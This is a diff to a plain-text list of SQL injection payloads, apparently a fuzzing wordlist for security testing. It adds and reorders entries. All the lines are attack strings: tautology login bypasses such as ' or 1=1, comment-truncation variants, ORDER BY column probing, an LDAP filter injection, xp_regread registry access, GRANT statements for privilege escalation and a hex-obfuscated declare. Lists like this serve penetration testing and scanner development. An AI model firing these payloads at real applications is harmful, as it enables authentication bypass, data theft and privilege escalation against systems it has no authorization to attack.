@@ -20,30 +20,24 @@
 ' or '1'='1%
 ' or 1=1
 ' or 1=1 /*
-or 0=0 #
-or 0=0 --
-or 0=0 %
-or 0=0 //
-a' or 1=1--
-a' or 'a' = 'a
+ or 0=0 #
+ or 0=0 --
+ or 0=0 %
+ or 0=0 //
 ; or '1'='1'
-"hi"") or (""a""=""a"
-hi or 1=1 --"
 ' AND id IS NULL; --
 ' AND id IS NULL; #
 ' AND id IS NULL; %
-1' ORDER BY 1--+
-1' ORDER BY 1,2--+
-1' ORDER BY 1,2,3--+
 )%20or%20('x'='x
 %20or%201=1
 ')%20or%20('x'='x
 '%20or%20''='
 '%20or%201=1
-; execute immediate 'sel' || 'ect us' || 'er'
-||(elt(-3+5,bin(15),ord(10),hex(char(45))))
-hi"""") or (""""a""""=""""a"""
+' or 1=1 order by 1#
+' or 1=1 order by 1--
+' or 1=1 order by 1//
 *(|(objectclass=*))
+declare @q nvarchar (200) 0x730065006c00650063 ...
  or 0=0 #
 ) or ('a'='a
 ; exec xp_regread
@@ -55,3 +49,19 @@ hi"""") or (""""a""""=""""a"""
  AND 1=0#
  AND 1=1 AND '%'='
  AND 1=0 AND '%'='
+' grant connect to name; grant resource to name; --
+' procedure analyse() #
+' procedure analyse() --
+' procedure analyse() //
+; execute immediate 'sel' || 'ect us' || 'er'
+||(elt(-3+5,bin(15),ord(10),hex(char(45))))
+a' or 1=1--
+a' or 'a' = 'a
+1' ORDER BY 1--+
+1' ORDER BY 1,2--+
+1' ORDER BY 1,2,3--+
+hi"""") or (""""a""""=""""a"""
+1 procedure analyse() #
+1 procedure analyse() --
+1 procedure analyse() //
+1 LIMIT 1,1 PROCEDURE ANALYSE() #
